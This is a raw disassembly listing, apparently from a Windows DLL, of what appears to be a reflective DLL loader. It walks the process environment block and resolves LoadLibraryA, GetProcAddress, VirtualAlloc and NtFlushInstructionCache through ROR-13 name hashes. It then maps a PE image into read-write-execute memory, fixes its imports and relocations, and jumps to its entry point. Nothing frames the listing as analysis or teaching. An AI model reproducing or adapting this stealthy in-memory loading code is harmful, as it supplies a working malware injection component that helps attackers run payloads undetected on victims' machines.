   180001de4:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180001de9:	48 83 c4 20          	add    $0x20,%rsp
   180001ded:	5f                   	pop    %rdi
   180001dee:	c3                   	ret
   180001def:	cc                   	int3
   180001df0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   180001df5:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180001dfa:	53                   	push   %rbx
   180001dfb:	55                   	push   %rbp
   180001dfc:	56                   	push   %rsi
   180001dfd:	57                   	push   %rdi
   180001dfe:	41 54                	push   %r12
   180001e00:	41 55                	push   %r13
   180001e02:	41 56                	push   %r14
   180001e04:	41 57                	push   %r15
   180001e06:	48 83 ec 38          	sub    $0x38,%rsp
   180001e0a:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   180001e11:	00 00 
   180001e13:	45 33 ed             	xor    %r13d,%r13d
   180001e16:	33 ed                	xor    %ebp,%ebp
   180001e18:	45 33 e4             	xor    %r12d,%r12d
   180001e1b:	45 33 c9             	xor    %r9d,%r9d
   180001e1e:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180001e23:	45 33 ff             	xor    %r15d,%r15d
   180001e26:	4c 89 8c 24 90 00 00 	mov    %r9,0x90(%rsp)
   180001e2d:	00 
   180001e2e:	4c 8b 40 18          	mov    0x18(%rax),%r8
   180001e32:	45 8d 55 01          	lea    0x1(%r13),%r10d
   180001e36:	4c 8b f2             	mov    %rdx,%r14
   180001e39:	8d 7d 02             	lea    0x2(%rbp),%edi
   180001e3c:	49 8b 70 20          	mov    0x20(%r8),%rsi
   180001e40:	48 89 b4 24 98 00 00 	mov    %rsi,0x98(%rsp)
   180001e47:	00 
   180001e48:	48 85 f6             	test   %rsi,%rsi
   180001e4b:	0f 84 fc 01 00 00    	je     0x18000204d
   180001e51:	8d 5d 04             	lea    0x4(%rbp),%ebx
   180001e54:	41 bb ff ff 00 00    	mov    $0xffff,%r11d
   180001e5a:	45 33 f6             	xor    %r14d,%r14d
   180001e5d:	48 8b 56 50          	mov    0x50(%rsi),%rdx
   180001e61:	49 8b c6             	mov    %r14,%rax
   180001e64:	44 0f b7 46 48       	movzwl 0x48(%rsi),%r8d
   180001e69:	0f b6 0a             	movzbl (%rdx),%ecx
   180001e6c:	c1 c8 0d             	ror    $0xd,%eax
   180001e6f:	80 f9 61             	cmp    $0x61,%cl
   180001e72:	72 04                	jb     0x180001e78
   180001e74:	48 83 c0 e0          	add    $0xffffffffffffffe0,%rax
   180001e78:	48 03 c1             	add    %rcx,%rax
   180001e7b:	49 03 d2             	add    %r10,%rdx
   180001e7e:	66 45 03 c3          	add    %r11w,%r8w
   180001e82:	75 e5                	jne    0x180001e69
   180001e84:	3d 5b bc 4a 6a       	cmp    $0x6a4abc5b,%eax
   180001e89:	0f 85 ce 00 00 00    	jne    0x180001f5d
   180001e8f:	48 8b 56 20          	mov    0x20(%rsi),%rdx
   180001e93:	be ff ff 00 00       	mov    $0xffff,%esi
   180001e98:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   180001e9c:	8b bc 10 88 00 00 00 	mov    0x88(%rax,%rdx,1),%edi
   180001ea3:	44 8b 54 17 20       	mov    0x20(%rdi,%rdx,1),%r10d
   180001ea8:	44 8b 5c 17 24       	mov    0x24(%rdi,%rdx,1),%r11d
   180001ead:	4c 03 d2             	add    %rdx,%r10
   180001eb0:	4c 03 da             	add    %rdx,%r11
   180001eb3:	45 8b 02             	mov    (%r10),%r8d
   180001eb6:	41 8b ce             	mov    %r14d,%ecx
   180001eb9:	4c 03 c2             	add    %rdx,%r8
   180001ebc:	41 8a 00             	mov    (%r8),%al
   180001ebf:	49 ff c0             	inc    %r8
   180001ec2:	c1 c9 0d             	ror    $0xd,%ecx
   180001ec5:	0f be c0             	movsbl %al,%eax
   180001ec8:	03 c8                	add    %eax,%ecx
   180001eca:	41 8a 00             	mov    (%r8),%al
   180001ecd:	84 c0                	test   %al,%al
   180001ecf:	75 ee                	jne    0x180001ebf
   180001ed1:	81 f9 8e 4e 0e ec    	cmp    $0xec0e4e8e,%ecx
   180001ed7:	74 18                	je     0x180001ef1
   180001ed9:	81 f9 aa fc 0d 7c    	cmp    $0x7c0dfcaa,%ecx
   180001edf:	74 10                	je     0x180001ef1
   180001ee1:	81 f9 54 ca af 91    	cmp    $0x91afca54,%ecx
   180001ee7:	74 08                	je     0x180001ef1
   180001ee9:	81 f9 ef ce e0 60    	cmp    $0x60e0ceef,%ecx
   180001eef:	75 51                	jne    0x180001f42
   180001ef1:	44 8b 4c 17 1c       	mov    0x1c(%rdi,%rdx,1),%r9d
   180001ef6:	45 0f b7 03          	movzwl (%r11),%r8d
   180001efa:	4c 03 ca             	add    %rdx,%r9
   180001efd:	81 f9 8e 4e 0e ec    	cmp    $0xec0e4e8e,%ecx
   180001f03:	75 09                	jne    0x180001f0e
   180001f05:	47 8b 2c 81          	mov    (%r9,%r8,4),%r13d
   180001f09:	4c 03 ea             	add    %rdx,%r13
   180001f0c:	eb 31                	jmp    0x180001f3f
   180001f0e:	81 f9 aa fc 0d 7c    	cmp    $0x7c0dfcaa,%ecx
   180001f14:	75 09                	jne    0x180001f1f
   180001f16:	47 8b 24 81          	mov    (%r9,%r8,4),%r12d
   180001f1a:	4c 03 e2             	add    %rdx,%r12
   180001f1d:	eb 20                	jmp    0x180001f3f
   180001f1f:	81 f9 54 ca af 91    	cmp    $0x91afca54,%ecx
   180001f25:	75 09                	jne    0x180001f30
   180001f27:	43 8b 2c 81          	mov    (%r9,%r8,4),%ebp
   180001f2b:	48 03 ea             	add    %rdx,%rbp
   180001f2e:	eb 0f                	jmp    0x180001f3f
   180001f30:	81 f9 ef ce e0 60    	cmp    $0x60e0ceef,%ecx
   180001f36:	75 07                	jne    0x180001f3f
   180001f38:	47 8b 3c 81          	mov    (%r9,%r8,4),%r15d
   180001f3c:	4c 03 fa             	add    %rdx,%r15
   180001f3f:	66 03 de             	add    %si,%bx
   180001f42:	49 83 c2 04          	add    $0x4,%r10
   180001f46:	49 83 c3 02          	add    $0x2,%r11
   180001f4a:	66 85 db             	test   %bx,%bx
   180001f4d:	0f 85 60 ff ff ff    	jne    0x180001eb3
   180001f53:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   180001f58:	e9 98 00 00 00       	jmp    0x180001ff5
   180001f5d:	3d 5d 68 fa 3c       	cmp    $0x3cfa685d,%eax
   180001f62:	0f 85 b0 00 00 00    	jne    0x180002018
   180001f68:	4c 8b 46 20          	mov    0x20(%rsi),%r8
   180001f6c:	be ff ff 00 00       	mov    $0xffff,%esi
   180001f71:	49 63 40 3c          	movslq 0x3c(%r8),%rax
   180001f75:	46 8b 9c 00 88 00 00 	mov    0x88(%rax,%r8,1),%r11d
   180001f7c:	00 
   180001f7d:	4d 03 d8             	add    %r8,%r11
   180001f80:	45 8b 53 20          	mov    0x20(%r11),%r10d
   180001f84:	45 8b 4b 24          	mov    0x24(%r11),%r9d
   180001f88:	4d 03 d0             	add    %r8,%r10
   180001f8b:	41 8b 5b 18          	mov    0x18(%r11),%ebx
   180001f8f:	4d 03 c8             	add    %r8,%r9
   180001f92:	85 db                	test   %ebx,%ebx
   180001f94:	74 5a                	je     0x180001ff0
   180001f96:	41 8b 12             	mov    (%r10),%edx
   180001f99:	41 8b ce             	mov    %r14d,%ecx
   180001f9c:	49 03 d0             	add    %r8,%rdx
   180001f9f:	8a 02                	mov    (%rdx),%al
   180001fa1:	48 ff c2             	inc    %rdx
   180001fa4:	c1 c9 0d             	ror    $0xd,%ecx
   180001fa7:	0f be c0             	movsbl %al,%eax
   180001faa:	03 c8                	add    %eax,%ecx
   180001fac:	8a 02                	mov    (%rdx),%al
   180001fae:	84 c0                	test   %al,%al
   180001fb0:	75 ef                	jne    0x180001fa1
   180001fb2:	81 f9 b8 0a 4c 53    	cmp    $0x534c0ab8,%ecx
   180001fb8:	74 0a                	je     0x180001fc4
   180001fba:	81 f9 1a 06 7f ff    	cmp    $0xff7f061a,%ecx
   180001fc0:	75 1f                	jne    0x180001fe1
   180001fc2:	eb 1a                	jmp    0x180001fde
   180001fc4:	41 8b 4b 1c          	mov    0x1c(%r11),%ecx
   180001fc8:	41 0f b7 11          	movzwl (%r9),%edx
   180001fcc:	49 03 c8             	add    %r8,%rcx
   180001fcf:	44 8b 24 91          	mov    (%rcx,%rdx,4),%r12d
   180001fd3:	4d 03 e0             	add    %r8,%r12
   180001fd6:	4c 89 a4 24 90 00 00 	mov    %r12,0x90(%rsp)
   180001fdd:	00 
   180001fde:	66 03 fe             	add    %si,%di
   180001fe1:	49 83 c2 04          	add    $0x4,%r10
   180001fe5:	49 83 c1 02          	add    $0x2,%r9
   180001fe9:	ff cb                	dec    %ebx
   180001feb:	66 85 ff             	test   %di,%di
   180001fee:	75 a2                	jne    0x180001f92
   180001ff0:	4c 8b 64 24 20       	mov    0x20(%rsp),%r12
   180001ff5:	4c 8b 8c 24 90 00 00 	mov    0x90(%rsp),%r9
   180001ffc:	00 
   180001ffd:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   180002003:	48 8b b4 24 98 00 00 	mov    0x98(%rsp),%rsi
   18000200a:	00 
   18000200b:	41 bb ff ff 00 00    	mov    $0xffff,%r11d
   180002011:	41 8d 7a 01          	lea    0x1(%r10),%edi
   180002015:	8d 5f 02             	lea    0x2(%rdi),%ebx
   180002018:	4d 85 ed             	test   %r13,%r13
   18000201b:	74 14                	je     0x180002031
   18000201d:	4d 85 e4             	test   %r12,%r12
   180002020:	74 0f                	je     0x180002031
   180002022:	48 85 ed             	test   %rbp,%rbp
   180002025:	74 0a                	je     0x180002031
   180002027:	4d 85 ff             	test   %r15,%r15
   18000202a:	74 05                	je     0x180002031
   18000202c:	4d 85 c9             	test   %r9,%r9
   18000202f:	75 14                	jne    0x180002045
   180002031:	48 8b 36             	mov    (%rsi),%rsi
   180002034:	48 89 b4 24 98 00 00 	mov    %rsi,0x98(%rsp)
   18000203b:	00 
   18000203c:	48 85 f6             	test   %rsi,%rsi
   18000203f:	0f 85 18 fe ff ff    	jne    0x180001e5d
   180002045:	4c 8b b4 24 88 00 00 	mov    0x88(%rsp),%r14
   18000204c:	00 
   18000204d:	49 63 5e 3c          	movslq 0x3c(%r14),%rbx
   180002051:	33 c9                	xor    %ecx,%ecx
   180002053:	49 03 de             	add    %r14,%rbx
   180002056:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   18000205c:	48 89 9c 24 88 00 00 	mov    %rbx,0x88(%rsp)
   180002063:	00 
   180002064:	44 8d 49 40          	lea    0x40(%rcx),%r9d
   180002068:	8b 53 50             	mov    0x50(%rbx),%edx
   18000206b:	ff d5                	call   *%rbp
   18000206d:	8b 53 54             	mov    0x54(%rbx),%edx
   180002070:	45 33 db             	xor    %r11d,%r11d
   180002073:	48 8b f8             	mov    %rax,%rdi
   180002076:	49 8b c6             	mov    %r14,%rax
   180002079:	41 8d 73 01          	lea    0x1(%r11),%esi
   18000207d:	48 85 d2             	test   %rdx,%rdx
   180002080:	74 14                	je     0x180002096
   180002082:	4c 8b c7             	mov    %rdi,%r8
   180002085:	4d 2b c6             	sub    %r14,%r8
   180002088:	8a 08                	mov    (%rax),%cl
   18000208a:	41 88 0c 00          	mov    %cl,(%r8,%rax,1)
   18000208e:	48 03 c6             	add    %rsi,%rax
   180002091:	48 2b d6             	sub    %rsi,%rdx
   180002094:	75 f2                	jne    0x180002088
   180002096:	0f b7 4b 14          	movzwl 0x14(%rbx),%ecx
   18000209a:	44 0f b7 4b 06       	movzwl 0x6(%rbx),%r9d
   18000209f:	48 03 cb             	add    %rbx,%rcx
   1800020a2:	4d 85 c9             	test   %r9,%r9
   1800020a5:	74 35                	je     0x1800020dc
   1800020a7:	48 83 c1 2c          	add    $0x2c,%rcx
   1800020ab:	8b 51 f8             	mov    -0x8(%rcx),%edx
   1800020ae:	4c 2b ce             	sub    %rsi,%r9
   1800020b1:	44 8b 01             	mov    (%rcx),%r8d
   1800020b4:	48 03 d7             	add    %rdi,%rdx
   1800020b7:	44 8b 51 fc          	mov    -0x4(%rcx),%r10d
   1800020bb:	4d 03 c6             	add    %r14,%r8
   1800020be:	4d 85 d2             	test   %r10,%r10
   1800020c1:	74 10                	je     0x1800020d3
   1800020c3:	41 8a 00             	mov    (%r8),%al
   1800020c6:	4c 03 c6             	add    %rsi,%r8
   1800020c9:	88 02                	mov    %al,(%rdx)
   1800020cb:	48 03 d6             	add    %rsi,%rdx
   1800020ce:	4c 2b d6             	sub    %rsi,%r10
   1800020d1:	75 f0                	jne    0x1800020c3
   1800020d3:	48 83 c1 28          	add    $0x28,%rcx
   1800020d7:	4d 85 c9             	test   %r9,%r9
   1800020da:	75 cf                	jne    0x1800020ab
   1800020dc:	8b b3 90 00 00 00    	mov    0x90(%rbx),%esi
   1800020e2:	48 03 f7             	add    %rdi,%rsi
   1800020e5:	8b 46 0c             	mov    0xc(%rsi),%eax
   1800020e8:	85 c0                	test   %eax,%eax
   1800020ea:	0f 84 90 00 00 00    	je     0x180002180
   1800020f0:	48 8b 6c 24 20       	mov    0x20(%rsp),%rbp
   1800020f5:	8b c8                	mov    %eax,%ecx
   1800020f7:	48 03 cf             	add    %rdi,%rcx
   1800020fa:	41 ff d5             	call   *%r13
   1800020fd:	44 8b 36             	mov    (%rsi),%r14d
   180002100:	4c 8b e0             	mov    %rax,%r12
   180002103:	44 8b 7e 10          	mov    0x10(%rsi),%r15d
   180002107:	4c 03 f7             	add    %rdi,%r14
   18000210a:	4c 03 ff             	add    %rdi,%r15
   18000210d:	45 33 db             	xor    %r11d,%r11d
   180002110:	eb 5a                	jmp    0x18000216c
   180002112:	4d 85 f6             	test   %r14,%r14
   180002115:	74 2e                	je     0x180002145
   180002117:	4d 39 1e             	cmp    %r11,(%r14)
   18000211a:	7d 29                	jge    0x180002145
   18000211c:	49 63 44 24 3c       	movslq 0x3c(%r12),%rax
   180002121:	41 0f b7 16          	movzwl (%r14),%edx
   180002125:	42 8b 8c 20 88 00 00 	mov    0x88(%rax,%r12,1),%ecx
   18000212c:	00 
   18000212d:	42 8b 44 21 10       	mov    0x10(%rcx,%r12,1),%eax
   180002132:	42 8b 4c 21 1c       	mov    0x1c(%rcx,%r12,1),%ecx
   180002137:	48 2b d0             	sub    %rax,%rdx
   18000213a:	49 03 cc             	add    %r12,%rcx
   18000213d:	8b 04 91             	mov    (%rcx,%rdx,4),%eax
   180002140:	49 03 c4             	add    %r12,%rax
   180002143:	eb 12                	jmp    0x180002157
   180002145:	49 8b 17             	mov    (%r15),%rdx
   180002148:	49 8b cc             	mov    %r12,%rcx
   18000214b:	48 83 c2 02          	add    $0x2,%rdx
   18000214f:	48 03 d7             	add    %rdi,%rdx
   180002152:	ff d5                	call   *%rbp
   180002154:	45 33 db             	xor    %r11d,%r11d
   180002157:	49 89 07             	mov    %rax,(%r15)
   18000215a:	49 8d 46 08          	lea    0x8(%r14),%rax
   18000215e:	49 83 c7 08          	add    $0x8,%r15
   180002162:	4d 85 f6             	test   %r14,%r14
   180002165:	49 0f 44 c6          	cmove  %r14,%rax
   180002169:	4c 8b f0             	mov    %rax,%r14
   18000216c:	4d 39 1f             	cmp    %r11,(%r15)
   18000216f:	75 a1                	jne    0x180002112
   180002171:	8b 46 20             	mov    0x20(%rsi),%eax
   180002174:	48 83 c6 14          	add    $0x14,%rsi
   180002178:	85 c0                	test   %eax,%eax
   18000217a:	0f 85 75 ff ff ff    	jne    0x1800020f5
   180002180:	4c 8b cf             	mov    %rdi,%r9
   180002183:	41 be 0a 00 00 00    	mov    $0xa,%r14d
   180002189:	4c 2b 4b 30          	sub    0x30(%rbx),%r9
   18000218d:	44 39 9b b4 00 00 00 	cmp    %r11d,0xb4(%rbx)
   180002194:	0f 84 b9 00 00 00    	je     0x180002253
   18000219a:	8b 93 b0 00 00 00    	mov    0xb0(%rbx),%edx
   1800021a0:	48 03 d7             	add    %rdi,%rdx
   1800021a3:	8b 42 04             	mov    0x4(%rdx),%eax
   1800021a6:	85 c0                	test   %eax,%eax
   1800021a8:	0f 84 a5 00 00 00    	je     0x180002253
   1800021ae:	bd ff 0f 00 00       	mov    $0xfff,%ebp
   1800021b3:	41 8d 5e f8          	lea    -0x8(%r14),%ebx
   1800021b7:	44 8b 02             	mov    (%rdx),%r8d
   1800021ba:	48 8d 72 08          	lea    0x8(%rdx),%rsi
   1800021be:	44 8b d0             	mov    %eax,%r10d
   1800021c1:	4c 03 c7             	add    %rdi,%r8
   1800021c4:	49 83 ea 08          	sub    $0x8,%r10
   1800021c8:	49 d1 ea             	shr    $1,%r10
   1800021cb:	74 70                	je     0x18000223d
   1800021cd:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   1800021d3:	44 0f b7 1e          	movzwl (%rsi),%r11d
   1800021d7:	4d 2b d7             	sub    %r15,%r10
   1800021da:	41 0f b7 c3          	movzwl %r11w,%eax
   1800021de:	41 0f b7 cb          	movzwl %r11w,%ecx
   1800021e2:	66 c1 e8 0c          	shr    $0xc,%ax
   1800021e6:	66 41 3b c6          	cmp    %r14w,%ax
   1800021ea:	75 10                	jne    0x1800021fc
   1800021ec:	4c 23 dd             	and    %rbp,%r11
   1800021ef:	4b 8b 0c 03          	mov    (%r11,%r8,1),%rcx
   1800021f3:	49 03 c9             	add    %r9,%rcx
   1800021f6:	4b 89 0c 03          	mov    %rcx,(%r11,%r8,1)
   1800021fa:	eb 33                	jmp    0x18000222f
   1800021fc:	66 83 f8 03          	cmp    $0x3,%ax
   180002200:	75 09                	jne    0x18000220b
   180002202:	48 23 cd             	and    %rbp,%rcx
   180002205:	46 01 0c 01          	add    %r9d,(%rcx,%r8,1)
   180002209:	eb 24                	jmp    0x18000222f
   18000220b:	66 41 3b c7          	cmp    %r15w,%ax
   18000220f:	75 11                	jne    0x180002222
   180002211:	48 23 cd             	and    %rbp,%rcx
   180002214:	49 8b c1             	mov    %r9,%rax
   180002217:	48 c1 e8 10          	shr    $0x10,%rax
   18000221b:	66 42 01 04 01       	add    %ax,(%rcx,%r8,1)
   180002220:	eb 0d                	jmp    0x18000222f
   180002222:	66 3b c3             	cmp    %bx,%ax
   180002225:	75 08                	jne    0x18000222f
   180002227:	48 23 cd             	and    %rbp,%rcx
   18000222a:	66 46 01 0c 01       	add    %r9w,(%rcx,%r8,1)
   18000222f:	48 03 f3             	add    %rbx,%rsi
   180002232:	45 33 db             	xor    %r11d,%r11d
   180002235:	4d 85 d2             	test   %r10,%r10
   180002238:	75 99                	jne    0x1800021d3
   18000223a:	8b 42 04             	mov    0x4(%rdx),%eax
   18000223d:	48 03 d0             	add    %rax,%rdx
   180002240:	8b 42 04             	mov    0x4(%rdx),%eax
   180002243:	85 c0                	test   %eax,%eax
   180002245:	0f 85 6c ff ff ff    	jne    0x1800021b7
   18000224b:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   180002252:	00 
   180002253:	8b 5b 28             	mov    0x28(%rbx),%ebx
   180002256:	45 33 c0             	xor    %r8d,%r8d
   180002259:	33 d2                	xor    %edx,%edx
   18000225b:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   18000225f:	48 03 df             	add    %rdi,%rbx
   180002262:	ff 94 24 90 00 00 00 	call   *0x90(%rsp)
   180002269:	4c 8b 84 24 80 00 00 	mov    0x80(%rsp),%r8
   180002270:	00 
   180002271:	41 8b d6             	mov    %r14d,%edx
   180002274:	48 8b cf             	mov    %rdi,%rcx
   180002277:	48 8b c3             	mov    %rbx,%rax
   18000227a:	48 83 c4 38          	add    $0x38,%rsp
   18000227e:	41 5f                	pop    %r15
   180002280:	41 5e                	pop    %r14
   180002282:	41 5d                	pop    %r13
   180002284:	41 5c                	pop    %r12
   180002286:	5f                   	pop    %rdi
   180002287:	5e                   	pop    %rsi
   180002288:	5d                   	pop    %rbp
   180002289:	5b                   	pop    %rbx
   18000228a:	48 ff e0             	rex.W jmp *%rax
	...
